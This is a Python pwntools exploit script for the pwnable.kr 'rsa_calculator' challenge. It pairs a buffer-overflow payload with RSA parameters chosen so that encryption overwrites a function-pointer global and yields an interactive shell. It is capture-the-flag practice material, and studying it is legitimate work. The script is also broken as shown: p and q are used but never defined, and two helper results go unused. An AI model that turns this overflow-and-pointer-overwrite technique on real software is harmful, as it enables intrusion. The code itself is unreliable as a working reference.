"""
b *0x00400e9c - after copying the input to the global plaintext buffer
b *0x00400f0d - after stored the encrypted text inside `g_ebuf`
b *0x00400b04 - after inputting p & q
b *0x00400bce - before calculating N 
b *0x00401408 - calling the handler function in main
0x6020e0 - g_ebuf
0x602500 - func
0x602560 - g_pbuf 
"""

from functools import reduce
from pwn import *
import numpy as np

context.log_level = 'info'

MODE = 'debug'
def conn():
    if MODE == 'local':
        return process('./rsa_calculator')
    elif MODE == 'remote':
        return remote('pwnable.kr', 9012)
    elif MODE == 'debug':
        return gdb.debug('./rsa_calculator', execute='''
                        b *0x00401408
                        continue
                         ''')


def extended_gcd(a, b):
    """g == a*x + b*y == gcd(a, b)"""
    if a == 0:
        return b, 0, 1
    else:
        g, x, y = extended_gcd(b % a, a)
        return g, y - (b // a) * x, x

def mod_inverse(e, m):
    g, x, _ = extended_gcd(e, m) # e*x + m*y = gcd(e, m)
    if g != 1:
        raise Exception('Modular inverse does not exist')
    else:
        return x % m

def prime_factors(n):
     i = 2
     factors = []
     while i * i <= n:
         if n % i:
             i += 1
         else:
             n //= i
             factors.append(i)
     if n > 1:
         factors.append(n)
     return factors



if __name__ == "__main__":
    pipe = conn()
    m = 40
    payload = 'A'* 264 + chr(m)

    target = 0x602500
    e = 5 
    n = m**e - target
    
    n_prime_factors = prime_factors(n)
    n_prime_factors = [2, 2, 2, 3, 5, 13, 797, 797]
    # p, q = n_prime_factors[-1], n_prime_factors[-2]

    # for prime_number in n_prime_factors[:-2]:
    #     if p > q:
    #         q *= prime_number
    #     else:
    #         p *= prime_number
    
    def f(lst, a=[], b=[], best=(np.inf, [], [])):
        if not lst:
            mul = lambda x,y :x*y
            pa = reduce(mul, a, 1)
            pb = reduce(mul, b, 1)
            val = pa-pb if pa>pb else pb-pa
            return (val, a, b) if val<best[0] else best
        vala = f(lst[1:], a+[lst[0]], b, best)
        valb = f(lst[1:], a, b+[lst[0]], best)
        if vala[0] < best[0]:
            best = vala
        if valb[0] < best[0]:
            best=valb
        return best
    a = f(n_prime_factors)
    def greedy(lst):
        prod = reduce(lambda x,y: x*y, lst, 1)
        sq_prod = np.sqrt(prod)
        a = []
        pa = 1
        val = abs(sq_prod - pa)
        b = []
        for n in lst[::-1]:
            if abs(pa*n - sq_prod) < val:
                val = abs(pa*n-sq_prod)
                pa*=n
                a.append(n)
            else:
                b.append(n)

        return val, a, b
    
    b = greedy(n_prime_factors)




    φ_n = (p - 1)*(q - 1) 
    d = mod_inverse(e, φ_n) 

    log.info('setting key pair values')
    pipe.sendlineafter(b'> ', b'1')
    pipe.sendlineafter(b'p : ', str(p).encode())
    pipe.sendlineafter(b'q : ', str(q).encode())
    pipe.sendlineafter(b'e : ', str(e).encode())
    pipe.sendlineafter(b'd : ', str(d).encode())

    log.info('sending payload')
    pipe.sendlineafter(b'> ', b'2')
    pipe.sendlineafter(b': ', str(len(payload)).encode())
    pipe.sendlineafter(b'paste your plain text data\n', payload.encode())

    pipe.interactive()